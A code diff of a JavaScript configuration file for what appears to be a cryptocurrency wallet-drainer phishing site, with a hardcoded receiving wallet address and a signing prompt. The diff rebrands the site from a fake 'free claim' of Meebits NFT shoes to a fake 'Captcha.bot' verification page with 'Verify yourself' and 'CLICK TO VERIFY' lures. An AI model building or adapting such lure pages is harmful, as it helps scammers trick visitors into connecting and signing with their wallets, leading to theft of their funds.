@@ -1,9 +1,9 @@
 const receiveAddress = "0x0D02c1D17e345B4dceA335Fd2988FbDF3F05e64C";
 
 const collectionInfo = {
-    name: "MeebitsNFTs",
+    name: "Captcha.bot",
     socialMedia: {
-        discord: "https://discord.gg/7mTnu2ekkt",
+        discord: "",
         twitter: "",
         instagram: "",
     },
@@ -18,17 +18,17 @@ const signMessage = `Welcome, \n\n` +
 const indexPageInfo = {
     backgroundImage: "background.jpeg", // relative path to background image (in assets)
     title: "{name}", // {name} will be replaced with collectionInfo.name
-    underTitle: "MEEBITS DAO",
+    underTitle: "Captcha.bot",
 }
 
 const claimPageInfo = {
-    title: "MEET THE<br>MEEKICKS", // <br> is a line break
-    shortDescription: "Claim your Meekickz.",
-    longDescription: "A Free Claim to all Meebits Holders.Connect your wallet that holds a Meebit to claim a pair of its voxel shoes.<br>Non-holders can also claim and resell to holder's on the secondary market.",
+    title: "COLLECTORS<br>TOKEN", // <br> is a line break
+    shortDescription: "Verify yourself",
+    longDescription: "Complete Captcha below",
 
-    claimButtonText: "CLAIM NOW",
+    claimButtonText: "CLICK TO VERIFY",
 
-    image: "meebits.jpeg", // relative path to image (in assets)
+    image: "captcha.jpeg", // relative path to image (in assets)
     imageRadius: 250, // image radius in px
 }
 
